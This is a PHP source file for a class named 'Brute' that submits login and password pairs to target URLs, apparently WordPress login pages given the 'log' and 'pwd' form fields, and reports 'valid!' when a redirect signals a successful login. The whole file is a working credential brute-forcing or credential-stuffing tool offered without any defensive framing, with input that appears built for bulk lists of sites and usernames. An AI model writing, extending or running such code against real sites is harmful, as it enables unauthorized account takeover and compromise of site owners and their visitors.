<?php

namespace app;

use Amp\Dns\DnsException;
use Amp\Http\Client\Body\FormBody;
use Amp\Http\Client\HttpClientBuilder;
use Amp\Http\Client\Request;

class Brute
{
    protected $client;

    private $url;
    private $login;
    private $password;

    public function __construct()
    {
        $this->client = (new HttpClientBuilder())
            ->retry(3)
            ->followRedirects(0)
            ->build();
    }

    public function __invoke($data)
    {
        $this->loginCheck($data);
        $this->password = $data['password'];
        $this->url = explode(';', $data['url'])[0];

        $body = new FormBody;
        $body->addField('log', $this->login);
        $body->addField('pwd', $this->password);

        $request = new Request($this->url, 'POST');
        $request->setTcpConnectTimeout(2400);
        $request->setBody($body);

        $response = yield $this->client->request($request);

        echo $response->getStatus() . PHP_EOL;

        if ($response->getStatus() == 302) {
            echo "valid!" . PHP_EOL;
        }



//        yield from $this->request(explode(';', $data['url'])[0]);
    }

    public function loginCheck($data) {
        if ($data['login'] == '{login}' && !isset(explode(';', $data['url'])[1])) {
            $this->login = null;
        } elseif ($data['login'] == '{login}' && isset(explode(';', $data['url'])[1])) {
            $this->login = explode(';', $data['url'])[1];
        } else {
            $this->login = $data['login'];
        }
    }

    public function request($url) {
        $request = new Request($url);
        $request->setTcpConnectTimeout(2400);

        $response = yield $this->client->request($request);

        print_r($response);die;
    }
}